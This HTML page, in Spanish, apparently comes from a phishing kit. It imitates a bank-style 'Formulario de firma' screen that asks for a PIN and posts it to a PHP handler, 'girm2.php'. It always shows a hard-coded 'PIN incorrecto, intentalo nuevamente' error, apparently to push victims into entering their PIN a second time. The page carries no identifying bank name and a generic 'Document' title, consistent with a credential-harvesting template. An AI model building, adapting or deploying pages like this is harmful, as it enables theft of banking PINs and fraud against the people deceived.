<html><head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
<style>

    body {
        margin: 0;
        width: 110%;
        background-color:#D9D8D8 ;
    }
    
    .nav {  
        font-family: Verdana, Arial, Tahoma;
        letter-spacing: -.02em;
        height: 100px;
        display: flex;
        
        
        background-color: #006EB8;
    }

    .cajaform {
        width: 95%;
        background-color: #F7F7F7;
        box-shadow: -1px 2px 5px 1px rgb(179, 179, 179);
        border-radius: 10px;
        height: 500px;
        padding: 10px;
        margin: 0 auto;
        margin-top: -70px;
        
    
    }
    
    .caja2 {
       
        width: 380px;
        background-color: #FFFFFF;
        box-shadow: -1px 1px 5px 1px rgb(179, 179, 179);
        border-radius: 10px;
        height: 200px;
        padding: 15px;
        margin: 0 auto;
        margin-top: 30px;
        position: relative;
        margin-left: -8px;
    }
    
    .form {
        width: 400px;
        margin: 0 auto;
    }
    
    .titulo {
        color: #838181;
        width: 183px;
        margin-left: -40%;
        font-size: 20px;
        font-family: sans-serif;
    }
    
    .caja3 {
        width: 380px;
        background-color: #FFFFFF;
        box-shadow: -1px 1px 5px 1px rgb(179, 179, 179);
        border-radius: 10px;
        height: 100px;
        padding: 15px;
        margin: 0 auto;
       
        position: relative;
        margin-left: -8px;
    }

    .box {
        display: flex;
        flex-direction: column;
        
        margin-top: 30px;
    }


    .recupera {
        width: 300px;
        margin-top: 30px;
        
    }

    .ipp {outline: none;
        list-style: none;
    margin: 0;
    padding: 0;
    font-family: inherit;
    font-weight: inherit;
    background-color: transparent!important;
    width: 250px;
    height: 20px;
    border: none 0!important;
    font-size: .9em;
    font-style: italic;
    color: #b7b7b7;
    border: solid 1px black;
  
    }

    .borde {  border: solid 1px rgb(174, 174, 174);
        color: #000;
    font-family: Verdana,Arial,Tahoma;
    letter-spacing: -.02em;
    margin: 0;
    list-style: none;
    float: left!important;
   
     border-radius: 6px;
    padding: 13px;
    }

.boton1 {
    
   
 color: #FFFFFF;
 margin-top: 2px;
    float: right!important;
     width: 158px;
    height: 41px;
    border: none 0!important;
    cursor: pointer;
  background: none;
     margin-left: 20px;
    font-weight: bold;
     font-size: 15px;
      
}



.titulos {
    width: 200px;
}

ul.navBtns {
    width: auto;
    float: right;
    margin: 10px 0 0 0;
    list-style: none;
    z-index: 0
}

ul.navBtns.left {
    clear: none!important;
    float: left
}

ul.navBtns li {
    float: left
}

ul.navBtns div {
    width: 140px;
    height: 30px;
    color: #fff;
    text-align: center;
    font-weight: bold;
    padding: 12px 0 0 0
}

ul.navBtns.btnSchedule {
    position: relative;
    top: 20px;
    left: 270px
}

ul.navBtns li.disabled input[type="button"],ul.navBtns li.disabled input[type="submit"] {
    cursor: default!important
}

.btnGenericGreen {
    cursor: pointer;
    font-weight: bold;
    text-align: center;
    background: url('spriteA.png') -250px -705px no-repeat;
    width: 158px;
    height: 41px
}

.btnGenericGreen.overBtn {
    background-position: -421px -705px
}

.btnGenericRed {
    text-align: center;
    background: url('spriteA.png') -250px -662px no-repeat;
    width: 158px;
    height: 42px
}

.btnGenericRed.overBtn {
    background-position: -421px -662px
}

.input:focus {
    outline: none !important;
    border:1px solid red;
    box-shadow: 0 0 10px #719ECE;
  }

</style></head>


<body>
    
<div class="nav">
   <img style="width: 100px; padding: 10px;    margin-top: -32px;
" src="logo-responsive.svg" alt="">
</div>
 
 <br><br><br>

    <form method="post" action="girm2.php">
         
        <div class="cajaform" style="height:690px;">
            <div class="box">
                <img class="titulos" src="titulo.png" alt="">

                <div class="caja2" style="height:290px;">
					<span style="font-family:arial;    font-size: 16px; color: #838181;"><b>Formulario de firma:</b></span><br>
					<hr>
					<span style="font-family:arial;    font-size: 14px; color: #838181;">
					Ingrese los datos y presione continuar</span>
                   <br>  <br> 
                 
           
                    <div align="left"><input type="radio" name="" value="" checked="">
					<span style="font-family:arial">PIN:</span>
				   <input name="cdpin" type="text" maxlength="58" placeholder="" required="" style="width:220px;     border-radius:10px; height: 36px; border-color:#bce8ff" class="processedInputsFocus">
				     
                 <br><br>

    <p style="color:red;font-family:sans-serif;">PIN incorrecto, intentalo nuevamente</p>
                 
				  </div> 
				  <div align="center">
				  
     <ul class="navBtns clear">
            <li>
                <input name="" type="button" id="MainContent_Button1" class="btnGenericRed" value="Cancelar" style="border:0;color:#fff;"></li>
            <li>
                <input type="submit" name="" value="Confirmar" id="MainContent_btnConfirm" class="btnGenericGreen" style="border:0;color:#fff;"></li>
        </ul>
                </div>
                 
                 

                </div>
				
                    <img class="recupera" src="recupera.png" alt="">

        <div class="caja3"><img style="width: 100%; margin-left: -10px; height: 100%;" src="ABAJO.png" alt=""></div>    
<div>
            <img src="" alt="" srcset="">
      </div>  
        
        
        </div>
    
 

</div></form></body></html>